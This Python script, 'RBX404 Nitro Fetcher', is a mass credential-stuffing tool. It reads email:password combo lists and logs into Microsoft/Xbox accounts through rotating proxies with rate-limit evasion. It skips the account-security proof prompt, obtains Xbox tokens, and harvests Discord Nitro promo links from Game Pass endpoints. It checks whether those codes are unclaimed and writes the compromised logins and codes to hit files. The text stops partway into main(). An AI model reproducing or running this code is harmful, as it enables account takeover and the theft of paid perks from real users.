#!/usr/bin/env python3
"""
RBX404 Nitro Fetcher - Mass Xbox Discord Promo Checker
Xbox Login → Fetch Discord Nitro Promos → Extract Codes → Dashboard
"""

import requests
import re
import time
import sys
import uuid
import json
import base64
import os
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from queue import Queue

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.text import Text
from rich.align import Align
from rich import box
from rich.columns import Columns
from rich.rule import Rule

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

console = Console()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
UA2 = "XboxApp/2203.1001.4.0 (Windows 10)"
REQUEST_EXCEPTIONS = (
    requests.exceptions.ProxyError,
    requests.exceptions.Timeout,
    requests.exceptions.SSLError,
    requests.exceptions.ConnectionError,
)

# ═══════════════════════════ BUILT-IN PROXY POOL ════════════════════════════

BUILTIN_PROXIES = [
]


class ProxyRotator:
    """Thread-safe rotating proxy pool with retry logic."""

    def __init__(self, proxy_list: list = None, use_proxies: bool = True):
        self.lock = threading.Lock()
        self.use_proxies = use_proxies
        self.proxies = []
        self.index = 0
        self.fail_counts = {}  # track failures per proxy
        self.max_fails = 5     # disable proxy after this many consecutive fails

        if use_proxies and proxy_list:
            for raw in proxy_list:
                parsed = self._parse_proxy(raw.strip())
                if parsed:
                    self.proxies.append(parsed)

        if use_proxies and not self.proxies:
            # Load built-in proxies
            for raw in BUILTIN_PROXIES:
                parsed = self._parse_proxy(raw.strip())
                if parsed:
                    self.proxies.append(parsed)

        # Shuffle for randomness
        if self.proxies:
            random.shuffle(self.proxies)

    def _parse_proxy(self, raw: str) -> dict:
        """
        Parse proxy formats:
          host:port:user:pass
          user:pass@host:port
          host:port
        Returns dict for requests proxies param.
        """
        if not raw:
            return None

        try:
            # Format: host:port:user:pass
            if raw.count(":") == 3 and "@" not in raw:
                parts = raw.split(":")
                host, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
                url = f"http://{user}:{pwd}@{host}:{port}"
                return {"http": url, "https": url, "_raw": raw}

            # Format: user:pass@host:port
            if "@" in raw:
                url = f"http://{raw}"
                return {"http": url, "https": url, "_raw": raw}

            # Format: host:port
            if raw.count(":") == 1:
                url = f"http://{raw}"
                return {"http": url, "https": url, "_raw": raw}

        except Exception:
            pass

        return None

    def get_proxy(self) -> dict:
        """Get next proxy in rotation (thread-safe). Returns None if no proxies."""
        if not self.use_proxies or not self.proxies:
            return None

        with self.lock:
            # Find a working proxy (skip heavily failed ones)
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.index % len(self.proxies)]
                self.index += 1
                raw = proxy.get("_raw", "")
                fails = self.fail_counts.get(raw, 0)

                if fails < self.max_fails:
                    return {k: v for k, v in proxy.items() if k != "_raw"}

                attempts += 1

            # All proxies failed too many times — reset and try anyway
            self.fail_counts.clear()
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return {k: v for k, v in proxy.items() if k != "_raw"}

    def report_success(self, proxy_dict: dict):
        """Mark proxy as successful (reset fail count)."""
        if not proxy_dict:
            return
        with self.lock:
            for p in self.proxies:
                if p.get("http") == proxy_dict.get("http"):
                    self.fail_counts[p.get("_raw", "")] = 0
                    break

    def report_failure(self, proxy_dict: dict):
        """Mark proxy as failed (increment fail count)."""
        if not proxy_dict:
            return
        with self.lock:
            for p in self.proxies:
                if p.get("http") == proxy_dict.get("http"):
                    raw = p.get("_raw", "")
                    self.fail_counts[raw] = self.fail_counts.get(raw, 0) + 1
                    break

    def get_active_count(self) -> int:
        """Number of proxies not yet max-failed."""
        with self.lock:
            return sum(
                1 for p in self.proxies
                if self.fail_counts.get(p.get("_raw", ""), 0) < self.max_fails
            )

    def get_total_count(self) -> int:
        return len(self.proxies)


# Global proxy rotator (initialized in main)
proxy_rotator: ProxyRotator = None

# ═══════════════════════════ GLOBAL STATS ═══════════════════════════════════

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total_combos = 0
        self.bad_lines = 0
        self.valid_lines = 0
        self.checked = 0
        self.hits = 0
        self.unclaimed = 0
        self.claimed = 0
        self.invalid = 0
        self.errors = 0
        self.proxy_errors = 0
        self.retries = 0
        self.hit_results = []
        self.invalid_results = []
        self.claimed_results = []
        self.unclaimed_results = []
        self.error_results = []

    def add_hit(self, email, password, promo_link, status):
        with self.lock:
            self.hits += 1
            self.hit_results.append((email, password, promo_link, status))

    def add_unclaimed(self, email, password, promo_link, status):
        with self.lock:
            self.unclaimed += 1
            self.unclaimed_results.append((email, password, promo_link, status))

    def add_claimed(self, email, password, info):
        with self.lock:
            self.claimed += 1
            self.claimed_results.append((email, password, info))

    def add_invalid(self, email, password, reason):
        with self.lock:
            self.invalid += 1
            self.invalid_results.append((email, password, reason))

    def add_error(self, email, password, error):
        with self.lock:
            self.errors += 1
            self.error_results.append((email, password, str(error)))

    def inc_checked(self):
        with self.lock:
            self.checked += 1

    def inc_proxy_error(self):
        with self.lock:
            self.proxy_errors += 1

    def inc_retry(self):
        with self.lock:
            self.retries += 1


stats = Stats()

# ═══════════════════════════ RETRY REQUEST HELPER ═══════════════════════════

MAX_RETRIES = 4


def retry_request(method, url, max_retries=MAX_RETRIES, **kwargs):
    """
    Make HTTP request with proxy rotation and retry logic.
    On error → rotate proxy → retry up to max_retries times.
    """
    global proxy_rotator

    last_error = None

    for attempt in range(max_retries):
        current_proxy = proxy_rotator.get_proxy() if proxy_rotator else None

        try:
            if current_proxy:
                kwargs["proxies"] = current_proxy

            kwargs.setdefault("timeout", 20)

            if method.upper() == "GET":
                resp = requests.get(url, **kwargs)
            elif method.upper() == "POST":
                resp = requests.post(url, **kwargs)
            else:
                resp = requests.request(method, url, **kwargs)

            # Rate limit check
            if RateLimitHandler.is_rate_limited(resp):
                stats.inc_retry()
                if current_proxy:
                    proxy_rotator.report_failure(current_proxy)
                cooldown = min(5 * (2 ** attempt), 60)
                time.sleep(cooldown)
                continue

            # Success
            if current_proxy:
                proxy_rotator.report_success(current_proxy)

            return resp

        except REQUEST_EXCEPTIONS as e:
            last_error = e
            stats.inc_proxy_error()
            stats.inc_retry()
            if current_proxy:
                proxy_rotator.report_failure(current_proxy)
            time.sleep(2 * (attempt + 1))
            continue

        except Exception as e:
            last_error = e
            stats.inc_retry()
            if current_proxy:
                proxy_rotator.report_failure(current_proxy)
            time.sleep(2)
            continue

    # All retries exhausted
    raise ConnectionError(
        f"Request to {url} failed after {max_retries} retries. Last error: {last_error}"
    )

# ═══════════════════════════ RATE LIMITER ════════════════════════════════════

class RateLimitHandler:
    @staticmethod
    def is_rate_limited(r) -> bool:
        if r.status_code in (429, 503):
            return True
        txt = r.text.lower()
        return any(k in txt for k in ["rate limit", "too many requests", "throttle", "retry after"])

    @staticmethod
    def handle(ep: str, retry: int = 0):
        cooldown = min(30 * (2 ** retry), 300)
        time.sleep(cooldown)

# ═══════════════════════════ DEVICE TOKEN ════════════════════════════════════

class DeviceToken:
    @staticmethod
    def _sign(method, uri_path, payload_str, priv_key):
        win_time = (int(time.time()) + 11644473600) * 10000000
        data = b"\x00\x00\x00\x01\x00"
        data += win_time.to_bytes(8, "big") + b"\x00"
        data += method.upper().encode() + b"\x00"
        data += uri_path.encode() + b"\x00"
        data += b"\x00"
        data += payload_str.encode("utf-8") + b"\x00"
        raw_sig = priv_key.sign(data, ec.ECDSA(hashes.SHA256()))
        r, s = decode_dss_signature(raw_sig)
        final = (
            b"\x00\x00\x00\x01"
            + win_time.to_bytes(8, "big")
            + r.to_bytes(32, "big")
            + s.to_bytes(32, "big")
        )
        return base64.b64encode(final).decode()

    @staticmethod
    def _proofkey(priv_key):
        def i2b64(x):
            return base64.urlsafe_b64encode(x.to_bytes(32, "big")).decode().rstrip("=")
        pub = priv_key.private_numbers().public_numbers
        return {
            "alg": "ES256",
            "crv": "P-256",
            "kty": "EC",
            "use": "sig",
            "x": i2b64(pub.x),
            "y": i2b64(pub.y),
        }

    @staticmethod
    def get() -> str:
        priv_key = ec.generate_private_key(ec.SECP256R1())
        payload_obj = {
            "Properties": {
                "AuthMethod": "ProofOfPossession",
                "DeviceType": "Win32",
                "Id": "{" + str(uuid.uuid4()).upper() + "}",
                "ProofKey": DeviceToken._proofkey(priv_key),
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT",
        }
        payload_str = json.dumps(payload_obj, separators=(",", ":"))
        sig = DeviceToken._sign("POST", "/device/authenticate", payload_str, priv_key)

        for attempt in range(MAX_RETRIES):
            try:
                resp = retry_request(
                    "POST",
                    "https://device.auth.xboxlive.com/device/authenticate",
                    data=payload_str.encode("utf-8"),
                    headers={
                        "Content-Type": "application/json; charset=utf-8",
                        "x-xbl-contract-version": "1",
                        "Signature": sig,
                        "User-Agent": UA,
                    },
                    max_retries=MAX_RETRIES,
                )
                token = resp.json().get("Token")
                if token:
                    return token
                time.sleep(2)
            except Exception:
                time.sleep(3)

        raise RuntimeError("DeviceToken failed after all retries")

# ═══════════════════════════ CODE EXTRACTOR ══════════════════════════════════

def extract_promo_codes(text: str) -> list:
    """Extract Discord promo links and Xbox codes from raw text."""
    found = []
    seen = set()

    # Discord gift / promo links
    discord_patterns = [
        r'https?://(?:discord\.gift|discord\.com/gifts|promos\.discord\.gg|discordapp\.com/gifts|discord\.com/billing/promotions)/([A-Za-z0-9_-]+)',
        r'https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/(?:gifts|billing/promotions)/([A-Za-z0-9_-]+)',
        r'"(https?://(?:discord\.gift|promos\.discord\.gg|discord\.com/(?:gifts|billing/promotions))/[A-Za-z0-9_-]+)"',
    ]
    for pat in discord_patterns:
        for m in re.finditer(pat, text, re.I):
            full = m.group(0).strip('"').strip("'")
            if full not in seen:
                seen.add(full)
                found.append(("DISCORD_PROMO", full))

    # Xbox 25-char codes
    for m in re.finditer(r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}', text):
        val = m.group()
        if val not in seen:
            seen.add(val)
            found.append(("XBOX_CODE", val))

    # JSON code/token fields
    for m in re.finditer(
        r'"(?:code|token|promotionCode|giftCode|promoCode|redeemCode)"\s*:\s*"([A-Za-z0-9_\-]{5,})"',
        text,
        re.I,
    ):
        val = m.group(1)
        if len(val) >= 10 and val not in seen:
            seen.add(val)
            found.append(("JSON_CODE", val))

    # Any URL with redeem/gift/promo/nitro
    for m in re.finditer(
        r'https?://[^\s"\'<>]+(?:redeem|gift|promo|nitro)[^\s"\'<>]*', text, re.I
    ):
        url = m.group()
        if url not in seen:
            seen.add(url)
            found.append(("REDEEM_URL", url))

    # resource fields with discord
    for m in re.finditer(r'"resource"\s*:\s*"(https?://[^"]+)"', text):
        url = m.group(1)
        if ("discord" in url.lower() or "nitro" in url.lower()) and url not in seen:
            seen.add(url)
            found.append(("RESOURCE_URL", url))

    return found

# ═══════════════════════════ COMBO PARSER ════════════════════════════════════

def parse_combo_line(line: str):
    """
    Advanced regex to extract email:password from various combo formats.
    """
    line = line.strip()
    if not line:
        return None

    # Skip decoration / info lines
    skip_patterns = [
        r'^\s*[└├─═╔╚║╗╝╠╣┐┘┌┬┴┼│]',
        r'^\s*\[(?:ACTIVE|PERPETUAL|INFO)\]',
        r'^\s*Generated:',
        r'^\s*Total\s+Hits:',
        r'^\s*={3,}',
        r'^\s*-{3,}',
        r'^\s*#',
        r'^\s*$',
    ]
    for sp in skip_patterns:
        if re.match(sp, line, re.I):
            return None

    # Pattern 1: email:password (possibly followed by | extra info)
    m = re.match(
        r'^([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})\s*[:;|]\s*(\S+)', line
    )
    if m:
        email = m.group(1).strip()
        rest = line[m.end(1):].strip()
        rest = re.sub(r'^[\s:;|]+', '', rest)
        pwd_match = re.match(r'^(\S+)', rest)
        if pwd_match:
            password = pwd_match.group(1).strip().rstrip('|').strip()
            if password:
                return (email, password)

    # Pattern 2: aggressive find
    m = re.match(
        r'.*?([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})\s*[:\s;|]+\s*(\S+)', line
    )
    if m:
        email = m.group(1).strip()
        password = m.group(2).strip().rstrip('|').strip()
        if password and len(password) >= 3:
            return (email, password)

    return None

# ═══════════════════════════ MS LOGIN ════════════════════════════════════════

def ms_login(email, pswd):
    """Returns (session, xbl_auth_header) or (None, error_reason)"""
    s = requests.Session()

    # Set proxy for this session
    current_proxy = proxy_rotator.get_proxy() if proxy_rotator else None
    if current_proxy:
        s.proxies = current_proxy

    bh = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": UA,
    }

    # Load login page with retry
    resp = None
    for attempt in range(MAX_RETRIES):
        try:
            # Rotate proxy on each retry
            if attempt > 0:
                new_proxy = proxy_rotator.get_proxy() if proxy_rotator else None
                if new_proxy:
                    s.proxies = new_proxy
                    if current_proxy:
                        proxy_rotator.report_failure(current_proxy)
                    current_proxy = new_proxy
                stats.inc_retry()

            resp = s.get(
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch&response_type=token&locale=en",
                headers=bh,
                timeout=20,
            )
            if RateLimitHandler.is_rate_limited(resp):
                time.sleep(5 * (attempt + 1))
                continue
            if current_proxy:
                proxy_rotator.report_success(current_proxy)
            break
        except REQUEST_EXCEPTIONS:
            stats.inc_proxy_error()
            time.sleep(3)
            continue
        except Exception as e:
            return None, f"Login page error: {e}"

    if resp is None:
        return None, "Could not load login page after retries"

    html = resp.text

    ppft = log_url = None
    for pat in [r'value=\\\"(.+?)\\\"', r'value="(.+?)"']:
        m = re.search(pat, html, re.S)
        if m:
            ppft = m.group(1)
            break
    for pat in [r'"urlPost":"(.+?)"', r"urlPost:'(.+?)'"]:
        m = re.search(pat, html, re.S)
        if m:
            log_url = m.group(1)
            break

    if not ppft or not log_url:
        return None, "Could not parse login form"

    # Submit credentials with retry
    log_data = (
        f"i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3"
        f"&passwd={pswd}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1"
        f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1"
        f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894"
    )
    ph = {
        **bh,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://login.live.com",
        "Referer": "https://login.live.com/",
        "Cache-Control": "max-age=0",
    }

    resp = None
    for attempt in range(MAX_RETRIES):
        try:
            if attempt > 0:
                new_proxy = proxy_rotator.get_proxy() if proxy_rotator else None
                if new_proxy:
                    s.proxies = new_proxy
                    if current_proxy:
                        proxy_rotator.report_failure(current_proxy)
                    current_proxy = new_proxy
                stats.inc_retry()

            resp = s.post(log_url, data=log_data, headers=ph, timeout=20)
            if RateLimitHandler.is_rate_limited(resp):
                time.sleep(5 * (attempt + 1))
                continue
            if current_proxy:
                proxy_rotator.report_success(current_proxy)
            break
        except REQUEST_EXCEPTIONS:
            stats.inc_proxy_error()
            time.sleep(3)
            continue
        except Exception as e:
            return None, f"Login POST error: {e}"

    if resp is None:
        return None, "Login POST failed after retries"

    # Handle proof page
    if "proofs/Add" in resp.text:
        try:
            ipt = resp.text.split('id="ipt" value="')[1].split('"')[0]
            pprid = resp.text.split('id="pprid" value="')[1].split('"')[0]
            uaid = resp.text.split('id="uaid" value="')[1].split('"')[0]
            fmHf = resp.text.split('id="fmHF" action="')[1].split('"')[0]
            xph = {
                **bh,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://account.live.com",
            }
            for attempt in range(MAX_RETRIES):
                try:
                    resp = s.post(
                        fmHf,
                        data=f"ipt={ipt}&pprid={pprid}&uaid={uaid}",
                        headers=xph,
                        timeout=20,
                    )
                    if not RateLimitHandler.is_rate_limited(resp):
                        break
                    time.sleep(5)
                except REQUEST_EXCEPTIONS:
                    continue

            canary = resp.text.split('id="canary" name="canary" value="')[1].split('"')[0]
            skip_url = resp.text.split('id="frmAddProof" method="post" action="')[1].split('"')[0]
            for attempt in range(MAX_RETRIES):
                try:
                    resp = s.post(
                        skip_url,
                        headers={**xph, "Referer": resp.url},
                        data={
                            "iProofOptions": "Email",
                            "canary": canary,
                            "action": "Skip",
                            "EmailAddress": "",
                            "PhoneNumber": "",
                            "PhoneCountryISO": "",
                        },
                        timeout=20,
                    )
                    if not RateLimitHandler.is_rate_limited(resp):
                        break
                    time.sleep(5)
                except REQUEST_EXCEPTIONS:
                    continue
                except Exception as e:
                    return None, f"Proof skip error: {e}"
        except Exception:
            pass

    # Extract RPS ticket
    try:
        rpsTicket = resp.url.split("access_token=")[1].split("&")[0]
    except (IndexError, AttributeError):
        if "identity/confirm" in getattr(resp, 'url', '') or "identity/confirm" in getattr(resp, 'text', ''):
            return None, "Identity confirmation required"
        if "account.live.com/recover" in getattr(resp, 'url', ''):
            return None, "Account recovery required"
        return None, "Invalid credentials or 2FA required"

    # Xbox Live user auth with retry
    xh = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.7",
        "Connection": "keep-alive",
        "Origin": "https://www.xbox.com",
        "User-Agent": UA,
        "content-type": "application/json",
        "x-xbl-contract-version": "1",
    }

    resp = None
    for attempt in range(MAX_RETRIES):
        try:
            if attempt > 0:
                new_proxy = proxy_rotator.get_proxy() if proxy_rotator else None
                if new_proxy:
                    s.proxies = new_proxy
                stats.inc_retry()

            resp = s.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                headers=xh,
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "RpsTicket": rpsTicket,
                        "SiteName": "user.auth.xboxlive.com",
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT",
                },
                timeout=20,
            )
            if not RateLimitHandler.is_rate_limited(resp):
                break
            time.sleep(5 * (attempt + 1))
        except REQUEST_EXCEPTIONS:
            stats.inc_proxy_error()
            time.sleep(3)
            continue
        except Exception as e:
            return None, f"Xbox user auth error: {e}"

    if resp is None:
        return None, "Xbox user auth failed after retries"

    try:
        userToken = resp.json()["Token"]
    except (KeyError, json.JSONDecodeError):
        return None, "Xbox user token failed"

    # Device token
    try:
        deviceToken = DeviceToken.get()
    except Exception as e:
        return None, f"Device token error: {e}"

    # XSTS token with retry
    resp = None
    for attempt in range(MAX_RETRIES):
        try:
            if attempt > 0:
                new_proxy = proxy_rotator.get_proxy() if proxy_rotator else None
                if new_proxy:
                    s.proxies = new_proxy
                stats.inc_retry()

            resp = s.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                headers={**xh, "authority": "xsts.auth.xboxlive.com"},
                json={
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [userToken],
                        "DeviceToken": deviceToken,
                    },
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT",
                },
                timeout=20,
            )
            if not RateLimitHandler.is_rate_limited(resp):
                break
            time.sleep(5 * (attempt + 1))
        except REQUEST_EXCEPTIONS:
            stats.inc_proxy_error()
            time.sleep(3)
            continue
        except Exception as e:
            return None, f"XSTS error: {e}"

    if resp is None:
        return None, "XSTS failed after retries"

    data = resp.json()
    if "Token" not in data:
        xerr = data.get("XErr", "?")
        em = {
            2148916233: "No Xbox account",
            2148916235: "Banned",
            2148916236: "Adult verify needed",
            2148916238: "Child account",
        }
        return None, em.get(xerr, f"XSTS error {xerr}")

    xsts = data["Token"]
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    xbl = f"XBL3.0 x={uhs};{xsts}"
    return s, xbl

# ═══════════════════════════ PROMO FETCHER ═══════════════════════════════════

PROMO_ENDPOINTS = [
    ("POST", "https://profile.gamepass.com/v2/offers/A3525E6D4370403B9763BCFA97D383D9/"),
    ("GET", "https://profile.gamepass.com/v1/perks"),
    ("GET", "https://profile.gamepass.com/v2/perks"),
    ("GET", "https://profile.gamepass.com/v1/perks/active"),
    ("GET", "https://profile.gamepass.com/v2/perks/active"),
    ("GET", "https://profile.gamepass.com/v1/profile"),
    ("GET", "https://profile.gamepass.com/v2/profile"),
]


def fetch_promos(session, xbl, email, password):
    """Fetch all promo endpoints for a single account."""
    ah = {
        "authorization": xbl,
        "User-Agent": UA,
        "Accept": "application/json",
        "Content-Type": "application/json",
    }

    all_codes = []

    for method, url in PROMO_ENDPOINTS:
        try:
            resp = None
            for attempt in range(MAX_RETRIES):
                try:
                    current_proxy = proxy_rotator.get_proxy() if proxy_rotator else None
                    px = current_proxy if current_proxy else {}

                    if method == "GET":
                        resp = requests.get(url, headers=ah, proxies=px, timeout=15)
                    else:
                        resp = requests.post(url, headers=ah, proxies=px, timeout=15)

                    if RateLimitHandler.is_rate_limited(resp):
                        if current_proxy:
                            proxy_rotator.report_failure(current_proxy)
                        stats.inc_retry()
                        time.sleep(3 * (attempt + 1))
                        continue

                    if current_proxy:
                        proxy_rotator.report_success(current_proxy)
                    break

                except REQUEST_EXCEPTIONS:
                    if current_proxy:
                        proxy_rotator.report_failure(current_proxy)
                    stats.inc_proxy_error()
                    stats.inc_retry()
                    time.sleep(2)
                    continue
                except Exception:
                    resp = None
                    break

            if resp is None:
                continue

            body = resp.text
            codes = extract_promo_codes(body)
            for ctype, cval in codes:
                if (ctype, cval) not in [(c[0], c[1]) for c in all_codes]:
                    all_codes.append((ctype, cval, url))

        except Exception:
            continue

    return all_codes

# ═══════════════════════════ PROMO STATUS CHECK ═════════════════════════════

def check_promo_status(promo_url: str) -> str:
    try:
        m = re.search(r'/([A-Za-z0-9_-]+)$', promo_url)
        if not m:
            return "invalid"

        code = m.group(1)

        for attempt in range(MAX_RETRIES):
            current_proxy = None

            try:
                current_proxy = proxy_rotator.get_proxy() if proxy_rotator else None
                proxies = current_proxy if current_proxy else None

                resp = requests.get(
                    f"https://discord.com/api/v10/entitlements/gift-codes/{code}",
                    headers={
                        "User-Agent": UA,
                        "Accept": "application/json"
                    },
                    proxies=proxies,
                    timeout=10,
                )

                # SUCCESS RESPONSE
                if resp.status_code == 200:
                    data = resp.json()

                    # Revoked
                    if data.get("revoked", False):
                        return "claimed"

                    # Expired
                    expires_at = data.get("expires_at")
                    if expires_at:
                        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
                        if exp_time < datetime.now(timezone.utc):
                            return "expired"
                            
                            #Usage check (most reliable)
                    uses = data.get("uses", 0)
                    max_uses = data.get("max_uses", 1)

                    if uses >= max_uses:
                        return "claimed"

                    # If still usable
                    return "unclaimed"

                # NOT FOUND
                elif resp.status_code == 404:
                    return "invalid"

                # RATE LIMITED
                elif resp.status_code == 429:
                    retry_after = resp.json().get("retry_after", 5)
                    time.sleep(retry_after)
                    continue

                # SERVER ERROR → RETRY
                elif resp.status_code >= 500:
                    time.sleep(2)
                    continue

                else:
                    return "unknown"

            except REQUEST_EXCEPTIONS:
                if current_proxy:
                    proxy_rotator.report_failure(current_proxy)
                time.sleep(2)
                continue

            except Exception:
                return "unknown"

        return "unknown"

    except Exception:
        return "unknown"

# ═══════════════════════════ WORKER ══════════════════════════════════════════

def process_account(email, password, progress_task, progress):
    """Process a single account: login → fetch promos → categorize."""
    try:
        result = ms_login(email, password)
        session, xbl_or_error = result

        if session is None:
            reason = xbl_or_error if isinstance(xbl_or_error, str) else "Unknown error"
            stats.add_invalid(email, password, reason)
            stats.inc_checked()
            progress.update(progress_task, advance=1)
            return

        # Login success — fetch promos
        xbl = xbl_or_error
        codes = fetch_promos(session, xbl, email, password)

        if codes:
            discord_promos = [
                c for c in codes if c[0] in ("DISCORD_PROMO", "REDEEM_URL", "RESOURCE_URL")
            ]
            xbox_codes = [c for c in codes if c[0] in ("XBOX_CODE", "JSON_CODE")]

            if discord_promos:
                for ctype, cval, src in discord_promos:
                    claimed = check_promo_status(cval)
                    if claimed == "unclaimed":
                        stats.add_hit(email, password, cval, "UNCLAIMED")
                    elif claimed == "claimed":
                        stats.add_claimed(email, password, cval)
                    else:
                        stats.add_hit(email, password, cval, "FOUND")
            elif xbox_codes:
                for ctype, cval, src in xbox_codes:
                    stats.add_hit(email, password, cval, "XBOX_CODE")
            else:
                for ctype, cval, src in codes:
                    stats.add_hit(email, password, cval, ctype)
        else:
            stats.add_unclaimed(email, password, "No promo available", "NO_PROMO")

        stats.inc_checked()
        progress.update(progress_task, advance=1)

    except Exception as e:
        stats.add_error(email, password, str(e))
        stats.inc_checked()
        progress.update(progress_task, advance=1)

# ═══════════════════════════ SAVE RESULTS ════════════════════════════════════

def save_results(output_dir: str):
    """Save all results to organized files."""
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    # ── Hits ──
    with open(os.path.join(output_dir, "hits.txt"), "w", encoding="utf-8") as f:
        f.write(f"RBX404 Nitro Fetcher - HITS\n")
        f.write(f"Generated: {timestamp}\n")
        f.write(f"Total Hits: {stats.hits}\n")
        f.write("=" * 70 + "\n\n")
        for email, pwd, promo, status in stats.hit_results:
            f.write(f"{email}:{pwd} - {promo} - {status}\n")

    # ── Unclaimed ──
    with open(os.path.join(output_dir, "unclaimed.txt"), "w", encoding="utf-8") as f:
        f.write(f"RBX404 Nitro Fetcher - UNCLAIMED / NO PROMO\n")
        f.write(f"Generated: {timestamp}\n")
        f.write(f"Total: {stats.unclaimed}\n")
        f.write("=" * 70 + "\n\n")
        for email, pwd, promo, status in stats.unclaimed_results:
            f.write(f"{email}:{pwd} - {promo} - {status}\n")

    # ── Claimed ──
    with open(os.path.join(output_dir, "claimed.txt"), "w", encoding="utf-8") as f:
        f.write(f"RBX404 Nitro Fetcher - ALREADY CLAIMED\n")
        f.write(f"Generated: {timestamp}\n")
        f.write(f"Total: {stats.claimed}\n")
        f.write("=" * 70 + "\n\n")
        for email, pwd, info in stats.claimed_results:
            f.write(f"{email}:{pwd} - {info}\n")

    # ── Invalid ──
    with open(os.path.join(output_dir, "invalid.txt"), "w", encoding="utf-8") as f:
        f.write(f"RBX404 Nitro Fetcher - INVALID ACCOUNTS\n")
        f.write(f"Generated: {timestamp}\n")
        f.write(f"Total: {stats.invalid}\n")
        f.write("=" * 70 + "\n\n")
        for email, pwd, reason in stats.invalid_results:
            f.write(f"{email}:{pwd} - {reason}\n")

    # ── Errors ──
    with open(os.path.join(output_dir, "errors.txt"), "w", encoding="utf-8") as f:
        f.write(f"RBX404 Nitro Fetcher - ERRORS\n")
        f.write(f"Generated: {timestamp}\n")
        f.write(f"Total: {stats.errors}\n")
        f.write("=" * 70 + "\n\n")
        for email, pwd, error in stats.error_results:
            f.write(f"{email}:{pwd} - {error}\n")

    # ── Summary ──
    with open(os.path.join(output_dir, "summary.txt"), "w", encoding="utf-8") as f:
        f.write("╔══════════════════════════════════════════════════════════╗\n")
        f.write("║         RBX404 NITRO FETCHER - FINAL SUMMARY            ║\n")
        f.write("╚══════════════════════════════════════════════════════════╝\n\n")
        f.write(f"Generated      : {timestamp}\n")
        f.write(f"Total Combos   : {stats.total_combos}\n")
        f.write(f"Bad Lines      : {stats.bad_lines}\n")
        f.write(f"Valid Lines    : {stats.valid_lines}\n")
        f.write(f"Checked        : {stats.checked}\n")
        f.write(f"Proxy Errors   : {stats.proxy_errors}\n")
        f.write(f"Total Retries  : {stats.retries}\n")
        f.write(f"\n{'─' * 50}\n\n")
        f.write(f"🎯 Hits (Promo Found)    : {stats.hits}\n")
        f.write(f"🆓 Unclaimed / No Promo  : {stats.unclaimed}\n")
        f.write(f"🔒 Already Claimed       : {stats.claimed}\n")
        f.write(f"❌ Invalid Accounts      : {stats.invalid}\n")
        f.write(f"💥 Errors                : {stats.errors}\n")
        f.write(f"\n{'═' * 50}\n")

        if stats.hit_results:
            f.write(f"\n🎯 ALL HITS:\n{'─' * 50}\n")
            for email, pwd, promo, status in stats.hit_results:
                f.write(f"  {email}:{pwd}\n")
                f.write(f"    └── Promo  : {promo}\n")
                f.write(f"    └── Status : {status}\n\n")

    return output_dir

# ═══════════════════════════ BANNER ══════════════════════════════════════════

BANNER_ART = """
[bold red]
    ███████╗██╗   ██╗██╗  ██╗██╗   ██╗███╗   ██╗ █████╗
    ██╔════╝██║   ██║██║ ██╔╝██║   ██║████╗  ██║██╔══██╗
    ███████╗██║   ██║█████╔╝ ██║   ██║██╔██╗ ██║███████║
    ╚════██║██║   ██║██╔═██╗ ██║   ██║██║╚██╗██║██╔══██║
    ███████║╚██████╔╝██║  ██╗╚██████╔╝██║ ╚████║██║  ██║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
[/bold red]
[bold white]            ⛩  NITRO FETCHER  ⛩[/bold white]
[dim]       Xbox Game Pass → Discord Nitro Promo Checker[/dim]
[dim]              Mass Checker  |  Proxy Rotation[/dim]
"""


def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    console.print(
        Panel(
            Align.center(BANNER_ART),
            border_style="red",
            box=box.DOUBLE_EDGE,
            padding=(0, 2),
        )
    )

# ═══════════════════════════ MAIN ════════════════════════════════════════════

def main():
    global proxy_rotator

    show_banner()
    console.print()

    # ── Combo file ──
